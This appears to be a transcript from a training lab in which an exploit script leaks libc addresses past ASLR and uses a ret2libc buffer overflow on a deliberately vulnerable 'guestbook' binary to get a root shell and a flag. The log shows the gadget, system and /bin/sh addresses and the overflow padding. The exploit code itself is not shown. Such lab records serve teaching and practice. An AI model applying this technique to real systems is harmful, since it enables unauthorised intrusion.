@@ -1,0 +1,79 @@
+==============================================================
+ TRANSCRIPT lab 10.2  -  2026-10-08 00:12:55 UTC
+ Server: Ubuntu 24.04.4 LTS, glibc 2.39-0ubuntu8.9, gcc 13.3.0
+ ASLR (randomize_va_space) = 2
+==============================================================
+$ ./build.sh
+[*] built: guestbook
+[*] flag.txt created
+
+$ ./exploit.py   (3 lan lien tiep de thay base libc DOI moi lan -> ASLR that su BAT)
+----- lan chay #1 -----
+    Stack:      No canary found
+[+] puts @ libc = 0x79842c687cc0
+[+] libc base   = 0x79842c600000
+===PWNED_10_2===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{wr1teup_leak_libc_ret2libc_ok}
+[+] 10.2 OK: leak libc + ret2libc -> shell + flag
+----- lan chay #2 -----
+    Stack:      No canary found
+[+] puts @ libc = 0x7451fee87cc0
+[+] libc base   = 0x7451fee00000
+===PWNED_10_2===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{wr1teup_leak_libc_ret2libc_ok}
+[+] 10.2 OK: leak libc + ret2libc -> shell + flag
+----- lan chay #3 -----
+    Stack:      No canary found
+[+] puts @ libc = 0x7ee8e9a87cc0
+[+] libc base   = 0x7ee8e9a00000
+===PWNED_10_2===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{wr1teup_leak_libc_ret2libc_ok}
+[+] 10.2 OK: leak libc + ret2libc -> shell + flag
+
+----- full log 1 lan (de doi chieu) -----
+[*] '/root/techlabs/pwn-p10/labs/10.2/guestbook'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[x] Starting local process './guestbook'
+[+] Starting local process './guestbook': pid 444191
+[*] Loaded 6 cached gadgets for './guestbook'
+[*] pop rdi ; ret (binary) = 0x401156
+[+] puts @ libc = 0x72c523e87cc0
+[+] libc base   = 0x72c523e00000
+[*] system  = 0x72c523e58750
+[*] /bin/sh = 0x72c523fcc42f
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 160B
+[x] Receiving all data: 196B
+[x] Receiving all data: 206B
+[x] Receiving all data: 323B
+[+] Receiving all data: Done (323B)
+[*] Stopped process './guestbook' (pid 444191)
+Cam on, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ da ghi so luu niem.
+===PWNED_10_2===
+uid=0(root) gid=0(root) groups=0(root)
+FLAG{wr1teup_leak_libc_ret2libc_ok}
+===END===
+====================================
+      PTIT Guestbook  v1.0
+====================================
+Moi ban ky ten: 
+[+] 10.2 OK: leak libc + ret2libc -> shell + flag
